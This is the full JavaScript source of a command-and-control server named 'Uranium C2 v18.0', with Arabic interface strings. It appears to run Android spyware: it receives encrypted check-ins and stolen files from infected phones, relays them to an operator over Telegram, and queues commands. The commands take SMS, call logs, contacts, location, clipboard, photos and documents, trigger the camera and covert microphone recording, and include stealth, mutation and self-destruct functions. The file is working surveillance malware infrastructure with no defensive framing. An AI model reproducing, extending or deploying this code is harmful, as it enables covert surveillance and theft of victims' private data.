// Uranium C2 v18.0 — Merged (v7 crypto + v17 commands)
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const sqlite3 = require('sqlite3').verbose();

const TOKEN = process.env.TG_TOKEN;
const CHAT_ID = process.env.TG_ID;
const MASTER_KEY = process.env.MASTER_KEY;

if (!TOKEN || !CHAT_ID || !MASTER_KEY) {
    console.error('[-] Missing env: TG_TOKEN, TG_ID, MASTER_KEY');
    process.exit(1);
}

const SECRET_KEY = crypto.scryptSync(MASTER_KEY, 'uranium-v18-salt', 32);
const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core_v18.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, android_sdk INTEGER, last_seen INTEGER, online INTEGER DEFAULT 0)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT DEFAULT 'PENDING', result TEXT, created_at INTEGER, sent_at INTEGER, completed_at INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS media_chunks (upload_id TEXT, node_id TEXT, file_name TEXT, chunk_index INTEGER, total_chunks INTEGER, is_last INTEGER, file_hash TEXT, received_at INTEGER, PRIMARY KEY (upload_id, chunk_index))`);
});

function encryptPayload(plainText) {
    const compressed = zlib.gzipSync(Buffer.from(plainText, 'utf8'));
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', SECRET_KEY, iv);
    const enc = Buffer.concat([cipher.update(compressed), cipher.final()]);
    const tag = cipher.getAuthTag();
    const packet = { v: iv.toString('hex'), g: tag.toString('hex'), d: enc.toString('hex') };
    return Buffer.from(JSON.stringify(packet), 'utf8').toString('base64');
}

function decryptPayload(b64) {
    try {
        const pkt = JSON.parse(Buffer.from(b64, 'base64').toString('utf8'));
        const iv = Buffer.from(pkt.v, 'hex');
        const tag = Buffer.from(pkt.g, 'hex');
        const data = Buffer.from(pkt.d, 'hex');
        const decipher = crypto.createDecipheriv('aes-256-gcm', SECRET_KEY, iv);
        decipher.setAuthTag(tag);
        const compressed = Buffer.concat([decipher.update(data), decipher.final()]);
        return zlib.gunzipSync(compressed).toString('utf8');
    } catch (e) { return null; }
}

const app = express();
const appBot = new telegramBot(TOKEN, { polling: true });
app.use(express.text({ type: 'application/json', limit: '100mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '200mb' }));

async function sendTg(msg, options = {}) {
    try { return await appBot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...options }); }
    catch (e) { console.error('TG:', e.message); }
}

async function sendTgDocumentSmart(filePath, caption) {
    if (!fs.existsSync(filePath)) return;
    const stats = fs.statSync(filePath);
    const sizeMB = stats.size / (1024 * 1024);
    const LIMIT = 45 * 1024 * 1024;
    if (stats.size <= LIMIT) {
        try { await appBot.sendDocument(CHAT_ID, filePath, { caption }); }
        catch (e) { await sendTg(`⚠️ فشل الإرسال، محفوظ في <code>${path.basename(filePath)}</code> (${sizeMB.toFixed(2)}MB)`); }
    } else {
        await sendTg(`📦 الملف <b>${path.basename(filePath)}</b> ضخم (${sizeMB.toFixed(2)}MB). يقسم...`);
        const fd = fs.openSync(filePath, 'r');
        const buffer = Buffer.alloc(LIMIT);
        let partNum = 1, bytesRead;
        while ((bytesRead = fs.readSync(fd, buffer, 0, LIMIT, null)) > 0) {
            const partPath = `${filePath}.part${String(partNum).padStart(3, '0')}`;
            fs.writeFileSync(partPath, buffer.subarray(0, bytesRead));
            try { await appBot.sendDocument(CHAT_ID, partPath, { caption: `${caption} — جزء ${partNum}` }); } catch (e) {}
            try { fs.unlinkSync(partPath); } catch (e) {}
            partNum++;
        }
        fs.closeSync(fd);
    }
}

function escapeHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

app.get('/', (req, res) => {
    res.send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM C2 v18.0 — Merged Matrix ONLINE [☢️]</h1></body></html>`);
});

app.post('/api/v3/uranium/stream', (req, res) => {
    const nodeId = req.headers['x-node-id'] || 'unknown';
    const nodeModel = req.headers['x-node-model'] || 'Unknown';
    const sdk = parseInt(req.headers['x-android-sdk'] || '0');

    db.run(`INSERT INTO nodes (id, model, android_sdk, last_seen, online) VALUES (?,?,?,?,1)
        ON CONFLICT(id) DO UPDATE SET model=excluded.model, android_sdk=excluded.android_sdk, last_seen=excluded.last_seen, online=1`,
        [nodeId, nodeModel, sdk, Date.now()]);

    const decrypted = decryptPayload(req.body);
    let payload;
    try { payload = JSON.parse(decrypted || req.body || '{}'); }
    catch { return res.status(400).json({ status: 'BAD_PAYLOAD' }); }

    if (payload.type === 'TEXT_REPORT') {
        const text = (payload.data || '').substring(0, 3800);
        if (text.length > 2) sendTg(`☢️ <b>[${escapeHtml(nodeId)} | ${escapeHtml(nodeModel)}]</b>\n<pre>${escapeHtml(text)}</pre>`);
        return res.json({ status: 'ACK', task: null });
    }

    if (payload.type === 'MEDIA_CHUNK') {
        handleMediaChunk(nodeId, payload);
        return res.json({ status: 'CHUNK_ACK', idx: payload.chunkIndex });
    }

    if (payload.type === 'TASK_RESULT') {
        db.run(`UPDATE tasks SET status='DONE', result=?, completed_at=? WHERE id=?`,
            [JSON.stringify(payload.result || {}), Date.now(), payload.taskId]);
        return res.json({ status: 'ACK', task: null });
    }

    db.get(`SELECT * FROM tasks WHERE node_id=? AND status='PENDING' ORDER BY id ASC LIMIT 1`, [nodeId], (err, row) => {
        if (!row) return res.json({ status: 'ACK', task: null });
        db.run(`UPDATE tasks SET status='SENT', sent_at=? WHERE id=?`, [Date.now(), row.id]);
        res.json({ status: 'ACK', task: { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') } });
    });
});

function handleMediaChunk(nodeId, p) {
    const { uploadId, fileName, chunkIndex, totalChunks, isLast, fileHash, data } = p;
    const buf = Buffer.from(data, 'base64');
    db.run(`INSERT OR REPLACE INTO media_chunks (upload_id,node_id,file_name,chunk_index,total_chunks,is_last,file_hash,received_at) VALUES (?,?,?,?,?,?,?,?)`,
        [uploadId, nodeId, fileName, chunkIndex, totalChunks, isLast ? 1 : 0, fileHash, Date.now()]);
    if (isLast) {
        db.get(`SELECT COUNT(*) as cnt FROM media_chunks WHERE upload_id=?`, [uploadId], (e, r) => {
            if (r && r.cnt === totalChunks) sendTg(`✅ ملف مكتمل: ${escapeHtml(fileName)} (${totalChunks} جزء) من <code>${nodeId}</code>`);
        });
    }
}

app.post('/api/v3/uranium/upload_raw', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';
        const fileName = path.basename(req.headers['x-file-name'] || `dump_${Date.now()}.bin`);
        if (!Buffer.isBuffer(req.body)) return res.status(400).json({ error: 'BAD_BINARY' });
        if (req.body.length > 60 * 1024 * 1024) return res.status(413).json({ error: 'TOO_LARGE' });

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);

        const saveDir = path.join(STORAGE_DIR, path.basename(nodeId));
        fs.mkdirSync(saveDir, { recursive: true });
        const finalPath = path.join(saveDir, `${Date.now()}_${fileName}`);
        fs.writeFileSync(finalPath, req.body);

        const mb = (req.body.length / 1024 / 1024).toFixed(2);
        await sendTg(`☢️ <b>حصاد:</b>\n📱 <code>${escapeHtml(nodeId)}</code> (${escapeHtml(nodeModel)})\n📂 <code>${escapeHtml(fileName)}</code> (${mb}MB)`);
        await sendTgDocumentSmart(finalPath, `☠️ ${fileName} (${mb}MB)`);
        res.json({ status: 'OK' });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

appBot.on('polling_error', (e) => {});
appBot.on('error', (e) => console.error('BOT:', e.message));

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(CHAT_ID)) return;
    const text = msg.text || '';

    if (text === '/start' || text === '/menu') {
        db.all(`SELECT * FROM nodes ORDER BY last_seen DESC LIMIT 15`, async (err, rows) => {
            if (!rows || !rows.length) return sendTg('⚠️ لا توجد نودات.');
            const kb = rows.map(n => [{ text: `${n.online ? '🟢' : '⚫'} ${n.model} (${n.id.substring(0,8)})`, callback_data: `menu_${n.id}` }]);
            await sendTg('☢️ <b>اختر النود:</b>', { reply_markup: { inline_keyboard: kb } });
        });
    }

    if (text === '/nodes') {
        db.all(`SELECT * FROM nodes ORDER BY last_seen DESC`, async (err, rows) => {
            if (!rows || !rows.length) return sendTg('لا نودات.');
            sendTg(rows.map(n => `${n.online ? '🟢' : '⚫'} <code>${n.id}</code>\n  ${escapeHtml(n.model)} | SDK ${n.android_sdk}`).join('\n\n'));
        });
    }

    if (text === '/tasks') {
        db.all(`SELECT * FROM tasks ORDER BY id DESC LIMIT 20`, async (err, rows) => {
            if (!rows || !rows.length) return sendTg('لا مهام.');
            sendTg(rows.map(t => `#${t.id} → <code>${t.node_id}</code>: ${t.action} [${t.status}]`).join('\n'));
        });
    }

    if (text === '/stats') {
        db.get(`SELECT COUNT(*) as t FROM nodes`, (e, a) => {
            db.get(`SELECT COUNT(*) as o FROM nodes WHERE online=1`, (e2, b) => {
                db.get(`SELECT COUNT(*) as p FROM tasks WHERE status='PENDING'`, (e3, c) => {
                    sendTg(`📊 نودات: ${a.t} | نشطة: ${b.o} | مهام: ${c.p}`);
                });
            });
        });
    }
});

appBot.on('callback_query', async (query) => {
    if (String(query.from.id) !== String(CHAT_ID)) return;
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        const kb = { inline_keyboard: [
            [{ text: '🔦 فلاش ON', callback_data: `cmd_CMD_FLASH_ON_${nodeId}` }, { text: '🔦 فلاش OFF', callback_data: `cmd_CMD_FLASH_OFF_${nodeId}` }],
            [{ text: '📳 اهتزاز', callback_data: `cmd_CMD_VIBRATE_${nodeId}` }, { text: '🔊 تنبيه صوتي', callback_data: `cmd_CMD_BEEP_${nodeId}` }],
            [{ text: '🎙️ تنصت ذكي (6s)', callback_data: `cmd_MIC_AI_LISTEN_${nodeId}` }, { text: '👁️ لقطة خاطفة', callback_data: `cmd_MICRO_BURST_SNAP_${nodeId}` }],
            [{ text: '📸 صورة كاميرا', callback_data: `cmd_EXTRACT_CAMERA_SNAP_${nodeId}` }, { text: '🎥 فيديو 10s', callback_data: `cmd_EXTRACT_VIDEO_SNAP_${nodeId}` }],
            [{ text: '📨 SMS', callback_data: `cmd_EXTRACT_SMS_${nodeId}` }, { text: '📞 مكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }],
            [{ text: '📇 جهات', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` }, { text: '📱 تطبيقات', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }],
            [{ text: '📍 GPS', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }, { text: '📋 حافظة', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }],
            [{ text: '🖼️ 20 صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }, { text: '📥 10 فيديو', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }],
            [{ text: '📁 DCIM ذكي', callback_data: `cmd_PROC_DCIM_${nodeId}` }, { text: '📥 Download ذكي', callback_data: `cmd_PROC_DOWNLOAD_${nodeId}` }],
            [{ text: '🖼️ Pictures', callback_data: `cmd_PROC_PICTURES_${nodeId}` }, { text: '📄 Documents', callback_data: `cmd_PROC_DOCUMENTS_${nodeId}` }],
            [{ text: '📊 فحص تخزين', callback_data: `cmd_STORAGE_AUDIT_${nodeId}` }, { text: '📶 Wi-Fi Autopilot', callback_data: `cmd_WIFI_AUTOPILOT_${nodeId}` }],
            [{ text: '🛰️ Geo Alert', callback_data: `cmd_GEO_FENCE_ALERT_${nodeId}` }, { text: '🧬 Poly Mutate', callback_data: `cmd_POLY_MUTATE_${nodeId}` }],
            [{ text: '🛡️ Stealth Blackout', callback_data: `cmd_STEALTH_BLACKOUT_${nodeId}` }],
            [{ text: '💥 Self Destruct', callback_data: `confirm_SELF_${nodeId}` }],
            [{ text: '🔙 رجوع', callback_data: 'back_home' }]
        ] };
        await appBot.editMessageText(`🎯 <b>النود:</b> <code>${nodeId}</code>`, {
            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: kb
        });
    }
    else if (data.startsWith('confirm_SELF_')) {
        const nodeId = data.replace('confirm_SELF_', '');
        await appBot.editMessageText(`⚠️ <b>تأكيد النسف الذاتي</b> <code>${nodeId}</code>؟`, {
            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[
                { text: '✅ نعم', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` },
                { text: '❌ إلغاء', callback_data: `menu_${nodeId}` }
            ]] }
        });
    }
    else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');
        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, '{}', 'PENDING', ?)`,
            [targetNodeId, action, Date.now()], async () => {
                await appBot.answerCallbackQuery(query.id, { text: `☢️ ${action}` });
                await sendTg(`⚡ <b>${action}</b> → <code>${targetNodeId}</code>`);
            });
    }
    else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id).catch(() => {});
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium C2 v18.0 on :${PORT}`));
